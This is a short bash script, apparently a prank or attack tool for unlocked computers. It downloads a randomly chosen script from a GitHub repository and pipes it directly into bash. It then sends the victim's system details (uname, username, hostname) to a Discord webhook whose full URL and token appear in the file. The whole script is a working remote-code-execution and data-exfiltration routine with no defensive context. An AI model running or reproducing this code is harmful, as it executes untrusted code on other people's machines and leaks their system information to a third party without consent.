#!/bin/bash

WEBHOOK_URL="https://discord.com/api/webhooks/895593267205394473/oq1QICNWHvypGXHu7AUoY5j1BD46CMv1TjD93KMxch1rU0niCLWFYjy0jK5ADhA99-ut"
rdm=$(( RANDOM % 15 ))

curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | bash
curl \
  -H "Content-Type: application/json" \
  -d "{\"content\":null,\"embeds\":[{\"title\":\"Script n°$rdm\", \"description\": \"$(curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | sed '2q;d')\",\"url\":\"https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh\",\"color\":16711680,\"fields\":[{\"name\":\"uname:\",\"value\":\"$(uname -a)\"},{\"name\":\"user\",\"value\":\"$USER\"},{\"name\":\"hostname\",\"value\":\"$(hostname)\"}]}]}" $WEBHOOK_URL
exit
